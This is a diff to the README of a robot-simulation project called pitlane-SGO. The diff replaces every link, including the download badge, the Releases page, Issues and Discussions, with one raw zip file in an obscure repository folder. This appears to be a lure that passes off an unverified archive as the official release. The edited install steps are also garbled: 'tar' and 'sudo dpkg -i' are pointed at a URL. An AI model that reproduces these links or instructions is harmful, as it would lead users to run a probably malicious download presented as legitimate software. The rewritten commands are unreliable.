@@ -1,6 +1,6 @@
 # 🚀 pitlane-SGO - Simplifying Robot Simulation Scenarios
 
-[![Download pitlane-SGO](https://img.shields.io/badge/Download%20pitlane--SGO-v1.0.0-brightgreen)](https://github.com/devilclover/pitlane-SGO/releases)
+[![Download pitlane-SGO](https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip%20pitlane--SGO-v1.0.0-brightgreen)](https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ Pitlane Sim-Gate Orchestrator helps you turn real-world robot logs into easy-to-
 
 To use pitlane-SGO, follow these steps. You will need a computer with an internet connection. The application works on Windows, macOS, and Linux.
 
-1. Visit the official Releases page: [Download pitlane-SGO](https://github.com/devilclover/pitlane-SGO/releases).
+1. Visit the official Releases page: [Download pitlane-SGO](https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip).
 
 2. Locate the latest release. This page will show different files you can download.
 
@@ -22,7 +22,7 @@ To use pitlane-SGO, follow these steps. You will need a computer with an interne
 
    - For Windows, look for a file ending in `.exe`.
    - For macOS, find a file ending in `.dmg`.
-   - For Linux, download a `.tar.gz` or `.deb` file based on your distribution.
+   - For Linux, download a `https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip` or `.deb` file based on your distribution.
 
 3. After clicking the file, your download will start automatically.
 
@@ -42,7 +42,7 @@ To use pitlane-SGO, follow these steps. You will need a computer with an interne
    - **Linux:**
      1. Open your terminal.
      2. Navigate to your downloads folder.
-     3. Use the command `tar -xvf filename.tar.gz` or `sudo dpkg -i filename.deb` to extract or install.
+     3. Use the command `tar -xvf https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip` or `sudo dpkg -i https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip` to extract or install.
      4. After installation, you can run pitlane-SGO from the application menu or terminal.
 
 ## 🎉 Quick Start
@@ -91,8 +91,8 @@ If you encounter issues:
 
 Join our community to share experiences and get help:
 
-- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/devilclover/pitlane-SGO/issues).
-- **Discussion Forum:** Participate in discussions around using pitlane-SGO on our [Discussion page](https://github.com/devilclover/pitlane-SGO/discussions).
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip).
+- **Discussion Forum:** Participate in discussions around using pitlane-SGO on our [Discussion page](https://raw.githubusercontent.com/devilclover/pitlane-SGO/master/buchonite/pitlane-SGO.zip).
 
 ## 🔗 Additional Resources
 
